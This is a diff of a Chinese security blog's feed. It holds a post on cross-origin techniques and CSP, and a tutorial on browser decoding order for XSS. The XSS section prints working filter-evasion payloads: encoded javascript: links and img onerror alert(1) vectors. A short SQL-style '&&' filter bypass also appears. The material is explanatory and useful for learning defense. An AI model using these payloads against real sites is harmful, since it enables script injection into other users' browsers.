+<p>CORS是HTML5标准提出的跨域资源共享(Cross Origin Resource Share)，支持GET、POST等所有HTTP请求。CORS需要服务器端设置<code>Access-Control-Allow-Origin</code>头，否则浏览器会因为安全策略拦截返回的信息。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *              # 允许所有域名访问，或者</span><br><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;a.com   # 只允许所有域名访问</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="4、document-domain"><a href="#4、document-domain" class="headerlink" title="4、document.domain"></a>4、document.domain</h3><ul>
+<li>原理：相同主域名不同子域名下的页面，可以设置document.domain让它们同域</li>
+</ul>
+<p>我们只需要在跨域的两个页面中设置document.domain就可以了。修改document.domain的方法只适用于不同子域的框架间的交互，要载入iframe页面。</p>
+<p>example：</p>
+<ol>
+<li>在页面 <a class="link"   href="http://a.example.com/a.html" >http://a.example.com/a.html<i class="fas fa-external-link-alt"></i></a> 设置document.domain</li>
+</ol>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span> = <span class="string">&quot;iframe&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://b.example.com/b.html&quot;</span> <span class="attr">onload</span> = <span class="string">&quot;test()&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.domain = <span class="string">&#x27;example.com&#x27;</span>;<span class="comment">//设置成主域</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="built_in">document</span>.getElementById(<span class="string">&#x27;￼iframe&#x27;</span>).contentWindow);</span></span><br><span class="line"><span class="javascript">        <span class="comment">//contentWindow 可取得子窗口的 window 对象</span></span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>在页面 <a class="link"   href="http://b.example.com/b.html" >http://b.example.com/b.html<i class="fas fa-external-link-alt"></i></a> 中设置document.domain</li>
+</ol>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.domain = <span class="string">&#x27;example.com&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//在iframe载入这个页面也设置document.domain，使之与主页面的document.domain相同</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="5、window-name"><a href="#5、window-name" class="headerlink" title="5、window.name"></a>5、window.name</h3><ul>
+<li>原理：window对象有个name属性，该属性有个特征：即在一个窗口(window)的生命周期内,窗口载入的所有的页面都是共享一个window.name的，每个页面对window.name都有读写的权限，window.name是持久存在一个窗口载入过的所有页面中的。</li>
+</ul>
+<p>这里有三个页面：</p>
+<ul>
+<li>sever.com/a.html 数据存放页面</li>
+<li>agent.com/b.html 数据获取页面</li>
+<li>agent.com/c.html 空页面，做代理使用</li>
+</ul>
+<p>a.html中，设定<code>window.name</code>作为需要传递的值</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.name = <span class="string">&#x27;I was there!&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    alert(<span class="built_in">window</span>.name);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>b.html中，当iframe加载后将iframe的<code>src</code>指向同域的<code>c.html</code>，这样就可以利用<code>iframe.contentWindow.name</code>获取要传递的值了</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">  iframe = <span class="built_in">document</span>.createElement(<span class="string">&#x27;iframe&#x27;</span>);</span></span><br><span class="line"><span class="javascript">  iframe.style.display = <span class="string">&#x27;none&#x27;</span>;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> state = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">  iframe.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span>(state === <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(iframe.contentWindow.name);</span></span><br><span class="line">      alert(data);</span><br><span class="line"><span class="javascript">      iframe.contentWindow.document.write(<span class="string">&#x27;&#x27;</span>);</span></span><br><span class="line">      iframe.contentWindow.close();</span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.body.removeChild(iframe);</span></span><br><span class="line"><span class="javascript">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(state === <span class="number">0</span>) &#123;</span></span><br><span class="line">      state = 1;</span><br><span class="line"><span class="javascript">      iframe.contentWindow.location = <span class="string">&#x27;http://agent.com/c.html&#x27;</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"><span class="javascript">  iframe.src = <span class="string">&#x27;http://sever.com/a.html&#x27;</span>;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.body.appendChild(iframe);</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="6、window-postMesage"><a href="#6、window-postMesage" class="headerlink" title="6、window.postMesage"></a>6、window.postMesage</h3><ul>
+<li>原理: HTML5新增的postMessage方法，通过postMessage来传递信息，对方可以通过监听message事件来监听信息。可跨主域名及双向跨域。</li>
+</ul>
+<p>这里有两个页面：</p>
+<ol>
+<li>agent.com/index.html</li>
+<li>server.com/remote.html</li>
+</ol>
+<p>本地代码index.html</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;proxy&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://server.com/remote.html&quot;</span> <span class="attr">onload</span> = <span class="string">&quot;postMsg()&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span>  </span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> obj = &#123;  </span></span><br><span class="line"><span class="javascript">            msg: <span class="string">&#x27;hello world&#x27;</span>  </span></span><br><span class="line">        &#125;  </span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">postMsg</span> (<span class="params"></span>)</span>&#123;  </span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> iframe = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;proxy&#x27;</span>);  </span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> win = iframe.contentWindow;  </span></span><br><span class="line"><span class="javascript">            win.postMessage(obj,<span class="string">&#x27;http://server.com&#x27;</span>);  </span></span><br><span class="line">        &#125;  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>postMessage</code>的使用方法： otherWindow.postMessage(message, targetOrigin);</p>
+<ul>
+<li>otherWindow: 指目标窗口，也就是给哪个window发消息，是 window.frames 属性的成员或者由 window.open 方法创建的窗口</li>
+<li>message: 是要发送的消息，类型为 String、Object (IE8、9 不支持)</li>
+<li>targetOrigin: 是限定消息接收范围，不限制请使用 <code>*</code></li>
+</ul>
+<p>server.com上remote.html，监听<code>message</code>事件，并检查来源是否是要通信的域。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span>(e.origin !== <span class="string">&#x27;http://localhost:8088&#x27;</span>) <span class="keyword">return</span>;</span></span><br><span class="line"><span class="javascript">            alert(e.data.msg+<span class="string">&quot; from &quot;</span>+e.origin);</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="7、片段标识符"><a href="#7、片段标识符" class="headerlink" title="7、片段标识符"></a>7、片段标识符</h3><ul>
+<li>原理：片段标识符（fragment identifier）指的是，URL的<code>#</code>号后面的部分，比如<code>http://example.com/x.html#fragment</code>的<code>#fragment</code>。如果只是改变片段标识符，页面不会重新刷新。</li>
+</ul>
+<p>父窗口可以把信息，写入子窗口的片段标识符。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> src = originURL + <span class="string">&#x27;#&#x27;</span> + data;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&#x27;myIFrame&#x27;</span>).src = src;</span><br></pre></td></tr></table></figure>
+<p>子窗口通过监听<code>hashchange</code>事件得到通知。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.onhashchange = checkMessage;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkMessage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> message = <span class="built_in">window</span>.location.hash;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>同样的，子窗口也可以改变父窗口的片段标识符。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">parent.location.href= target + <span class="string">&quot;#&quot;</span> + hash;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="内容安全策略（CSP）"><a href="#内容安全策略（CSP）" class="headerlink" title="内容安全策略（CSP）"></a>内容安全策略（CSP）</h2><p>CSP的主要目标是减少和报告XSS攻击. XSS攻击利用浏览器对从服务器接受的内容的信任。恶意的脚本在受害的浏览器被执行, 因为浏览器相信内容源，甚至当内容源并不是从它应该来的地方过来的。</p>
+<p>CSP使服务器管理员能够通过制定浏览器能够执行的可信赖脚本的域名来减少或者消除由XSS可能出现的矢量。 一个兼容CSP的浏览器将只会执行加载与白名单域名的源文件的脚本，忽略那些其他的脚本（包括内联脚本和事件操控HTML属性）</p>
+<p>具体内容可以看：<a class="link"   href="http://www.ruanyifeng.com/blog/2016/09/csp.html" >Content Security Policy 入门教程<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://lightless.me/archives/review-SOP.html" >再谈同源策略<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://xz.aliyun.com/t/224" >跨域方法总结<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" >浏览器同源政策及其规避方法<i class="fas fa-external-link-alt"></i></a></p>
+]]></content>
+      <categories>
+        <category>安全</category>
+      </categories>
+      <tags>
+        <tag>XSS</tag>
+      </tags>
   </entry>
   <entry>
     <title>CSS基础</title>
@@ -2232,6 +2405,173 @@
       </tags>
   </entry>
   <entry>
+    <title>XSS编码剖析</title>
+    <url>/2021/03/13/XSS%E7%BC%96%E7%A0%81%E5%89%96%E6%9E%90/</url>
+    <content><![CDATA[<h2 id="XSS编码剖析"><a href="#XSS编码剖析" class="headerlink" title="XSS编码剖析"></a>XSS编码剖析</h2><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在不了解HTML、JavaScript在网页中编码解码的原理之前，我就有一个疑惑，为什么有时候一些关键字被过滤掉了之后可以使用编码进行绕过，编码之后的内容仍然可以在页面中解析出来；可是反过来后端防御攻击的手段又是将输入的内容进行编码转义，如PHP中的<code>htmlspecialchars()</code>函数，使得其中的内容变为一般的字符输出，而不会在页面中解析出来。这两者有关联吗，其中的原因又是什么？</p>
+<h2 id="浏览器响应过程"><a href="#浏览器响应过程" class="headerlink" title="浏览器响应过程"></a>浏览器响应过程</h2><p>来看看浏览器处理一次完整的HTTP请求，会涉及到的编码解码问题。</p>
+<ol>
+<li>当浏览器发送HTTP请求时，会先对特殊字符进行URL编码后，发送给服务器。</li>
+<li>服务器收到客户端发送来的HTTP请求，会对其进行URL解码后，再进行处理，处理完成后将结果返回给浏览器。</li>
+<li>浏览器接收到HTML文件后，最先是触发HTML解析器来解析HTML，将标签转化为内容树中的DOM节点，此时在识别标签的时候，HTML解析器是不能识别哪些被HTML实体编码了，只有当整个DOM树建立起来后，才能对每个节点的内容进行识别，如果有HTML实体编码，再对其进行解码。</li>
+<li>在HTML解析器过程中，遇到JS标签诸如<code>&lt;script&gt;</code>会调用JS解释器对JS代码进行解析，而JS DOM API会对DOM结构进行更改，DOM树节点的更改也会反过来触发HTML解释器。</li>
+<li>CSS解释器也会在HTML解释器过程中参与进来，但它不会干扰到DOM树，它会结合<code>&lt;style&gt;</code>标签和CSS文件以及HTML指令来构建render tree。</li>
+</ol>
+<h2 id="常用编码"><a href="#常用编码" class="headerlink" title="常用编码"></a>常用编码</h2><h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><p>URL编码是为了允许URL中存在汉字这样的非标准字符，本质是把一个字符转为%加上UTF-8编码对应的16进制数字。所以又称之为Percent-encoding。</p>
+<p>在服务端接收到请求时，会自动对请求进行一次URL解码。</p>
+<p>这里值得一提的是，URL编码作用并不在于绕过后台检测，但是当我们是以GET方式提交数据时，如果数据中存在<code>&amp;</code>、<code>#</code>、<code>+</code>这样的特殊字符，就需要进行URL编码，才能够保障正常解析，因为这些字符在URL中都有特殊的功能，不进行编码就会默认为是特殊的功能。</p>
+<p>example：</p>
+<p>服务器后端对<code>and</code>这个关键字进行了拦截，这时候我们想使用<code>&amp;&amp;</code>来代替，如果我们在URL中输入</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 &amp;&amp; 1&#x3D;2</span><br></pre></td></tr></table></figure>
+<p>这时候后端收到的并不是<code>id=1 &amp;&amp; 1=2</code>，而是<code>id=1</code>和<code>1=2</code>，这是由于<code>&amp;</code>的存在导致后端认为我们输入的2个参数而不是一个，正确的输入为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 %26%26 1&#x3D;2</span><br></pre></td></tr></table></figure>
+<p>通过URL编码让后端认为我们输入的<code>&amp;</code>并不是想要输入多个参数，而是原来就是<code>&amp;</code>的字符，就好像是我们在字符串中想要输出<code>\</code>的时候，我们要使用<code>\\</code>进行转义一样。</p>
+<h3 id="HTML编码"><a href="#HTML编码" class="headerlink" title="HTML编码"></a>HTML编码</h3><p>当浏览器接收到服务端发送来的二进制数据后，首先会对其进行HTML解码，呈现出来的就是我们看到的源代码。具体的解码方式依具体情况而定，所以我们需要在页面中指定编码，防止浏览器按照错误的方式解码，造成乱码。</p>
+<p>但是在HTML中有些字符是和关键词冲突的，比如<code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>，解码之后，浏览器会误认为它们是标签，怎么解决呢？</p>
+<p>为了正确地显示预留字符，我们需要在HTML源代码中使用字符实体，比如我们常见的空格<code>&amp;nbsp;</code>，字符实体以&amp;开头+预先定义的实体名称表示，但不是所有的字符都有实体名称，但是它们都有实体编号，也可以用&amp;#开头+实体编号+分号表示。比如：</p>
+<table>
+<thead>
+<tr>
+<th>显示结果</th>
+<th>描述</th>
+<th>实体名称</th>
+<th>实体编号</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&lt;</td>
+<td>小于号</td>
+<td><code>&amp;lt;</code></td>
+<td><code>&amp;#60;</code></td>
+</tr>
+<tr>
+<td>&gt;</td>
+<td>大于号</td>
+<td><code>&amp;gt;</code></td>
+<td><code>&amp;#62;</code></td>
+</tr>
+</tbody></table>
+<p><strong>浏览器对HTML解码之后就开始解析HTML，将标签转化为内容树中的DOM节点，此时识别标签的时候，HTML解析器是无法识别那些被实体编码的内容的，只有建立起DOM树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码，只要是DOM节点里属性的值，都可以被HTML编码和解析</strong>。</p>
+<p>所以在PHP中，使用<code>htmlspecialchars()</code>函数把预定义的字符转换为HTML实体，只有等到DOM树建立起来后，才会解析HTML实体，起到了XSS防护作用。因此，具体来说，我们对HTML标签的结构进行实体编码就会导致他在浏览器解析的时候无法认为这是一个标签，而是一个串，但是当标签建立之后，里面的内容是能够被HTML解析出来的。</p>
+<p>example：</p>
+<ul>
+<li>这是无法被解析出来，因为编码破坏了标签本身的结构</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>&amp;#<span class="attr">x3d</span>;&quot;<span class="attr">http:</span>//<span class="attr">www.example.com</span>&quot;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">s</span>&amp;#<span class="attr">x72</span>;<span class="attr">c</span>=<span class="string">&quot;http://www.example.com&quot;</span>&gt;</span></span><br><span class="line">&lt;s<span class="symbol">&amp;#x63;</span>ript&gt;alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>这是能够被解析出来，因为结构没有被破坏，里面的内容可以被解析</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;ht<span class="symbol">&amp;#x74;</span>p://www.example.com&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">onerror</span>=<span class="string">aler&amp;#x74;(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="JavaScript解码（Unicode）"><a href="#JavaScript解码（Unicode）" class="headerlink" title="JavaScript解码（Unicode）"></a>JavaScript解码（Unicode）</h3><p>当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如<code>&lt;script&gt; &lt;style&gt;</code>这样的标签，解析器会自动切换到JS解析模式，而<code>src</code>、 <code>href </code>后边加入的JavaScript伪URL，也会进入JS 的解析模式。而进入该解析模式的时候，该DOM节点已经建立起来了，但是HTML解释器还并未进行HTML解码。当触发JS解释器后，JS会先对内容进行解析，如果有JS编码就会进行解码操作，接下来是就是执行里面的JS语句。所以此时执行该JS语言前的解码顺序为JS解码–&gt;HTML解码。</p>
+<p>在一个页面中，可以出发JS 解析器的方式有这么几种：</p>
+<ul>
+<li>直接嵌入<code>&lt;script&gt;</code> 代码块。</li>
+<li>通过<code>&lt;script src=… &gt;</code> 加载代码。</li>
+<li>各种HTML CSS 参数支持JavaScript：URL 触发调用。</li>
+<li>CSS expression(…) 语法和某些浏览器的XBL 绑定。</li>
+<li>事件处理器(Event handlers),比如 onload, onerror, onclick等等。</li>
+<li>定时器，Timer(setTimeout, setInterval)</li>
+<li>eval(…) 调用。</li>
+</ul>
+<p>example：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;&lt;\u4e00&gt;&#x27;)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里的<code>herf</code>的URL经过URL解码之后发现，使用了JavaScript伪协议，所以JS会对内容进行解析，里边有一个转义字符<code>\u4e00</code>，前导的 u 表示他是一个unicode 字符，根据后边的数字，解析为<code>一</code>，于是在完成JS的解析之后变成了：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;&lt;一&gt;&#x27;)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>仍以上一段代码为例，假如我们编码的位置不是括号里，而是在alert上，JS是会对它进行解码的：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:\u0061lert(&#x27;&lt;一&gt;&#x27;)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>但是，不能对协议类型进行任何编码，因为这样会导致URL认不出来是JavaScript伪协议，从而不会进行JS解析！！</strong></p>
+<p>而另一方面，如果想用这种方式来替换掉圆括号，或者引号，会判定为失败，因为对于JavaScript，转义编码应当只出现在标示符部分，不能用于对语法有真正影响的符号，也就是括号，或者是引号。同时，<strong>上边这种直接在字符串外进行编码的方式，只有 Unicode 编码方式被支持，其他编码方式则不行</strong>。</p>
+<h2 id="XSS编码实践"><a href="#XSS编码实践" class="headerlink" title="XSS编码实践"></a>XSS编码实践</h2><p>我们从几个简单的例子回顾加深一下浏览器解析代码的过程：</p>
+<h3 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当服务器返回一个如上的代码时，首先是HTML解析器开始工作，检查语句是结构完整的<code>&lt;a&gt;</code>标签语法，于是就先建立了一个DOM节点；然后对<code>href</code>里面的内容进行HTML解码；由于<code>href</code>属性的值是URL，因此会对<code>herf</code>属性的值进行URL解码；接着由于URL的协议类型是JavaScript伪协议，然后就会进行JS解码，最后执行语句。</p>
+<p>整个解析顺序为3个环节：HTML解码 –&gt;URL解码 –&gt;JS解码</p>
+<p>我们可以对其做以下变形，下列情况都可以成功弹框：</p>
+<ul>
+<li>将<code>javascript:alert(&#39;xss&#39;)</code>转化为HTML实体，因为解析HTML之后，建立起<code>&lt;a&gt;</code>DOM节点，然后对DOM节点里面的HTML实体进行解析。</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;<span class="symbol">&amp;#x6a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x6c;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x28;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x29;</span>&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>注意：这里还要多一个步骤进行URL编码，因为里面的<code>&amp;</code>和<code>#</code>都有特殊功能</strong></p>
+<p>因此真正提交的URL应该是这样的</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;%26%23x6a%3B%26%23x61%3B%26%23x76%3B%26%23x61%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x3a%3B%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>对<code>alert(1);</code>进行URL编码，因为在HTML解析之后会对<code>href</code>的值进行URL解码，不过实际上这里没有需要URL转义的内容，因此还是一样</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>对<code>alert</code>做JS编码，因为在URL解码之后，发现URL资源类型为JavaScript，因此会调用JS解析器来对JS代码进行解析</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:\u0061\u006c\u0065\u0072\u0074(1)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>混合编码</li>
+</ul>
+<p>由于浏览器解码的过程是：HTML解码 –&gt;URL解码 –&gt;JS解码</p>
+<p>因此我们可以反过来编码：JS解码 –&gt;URL解码 –&gt;HTML解码</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1. 源代码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">2. 对alert进行JS编码（Unicode）</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:\u0061\u006c\u0065\u0072\u0074(1)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">3. 对href标签中的除了协议名字(javascript:)以外的部分进行URL编码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:%5Cu0061%5Cu006c%5Cu0065%5Cu0072%5Cu0074(1)&quot;</span>&gt;</span></span><br><span class="line">4. 对href的值进行HTML编码（再加上要URL编码）</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;%26%23x6a%3B%26%23x61%3B%26%23x76%3B%26%23x61%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x3a%3B%26%23x25%3B%26%23x35%3B%26%23x43%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x31%3B%26%23x25%3B%26%23x35%3B%26%23x43%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x63%3B%26%23x25%3B%26%23x35%3B%26%23x43%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x35%3B%26%23x25%3B%26%23x35%3B%26%23x43%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x37%3B%26%23x32%3B%26%23x25%3B%26%23x35%3B%26%23x43%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x37%3B%26%23x34%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这个例子和案例一类似，只不过由于<code>onerror</code>是事件，本来就属于JS操作，因此只是比案例一少了个URL解码，下列情况都可以成功弹框：</p>
+<ul>
+<li>对<code>alert(1)</code>进行HTML编码(再加上URL编码)</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
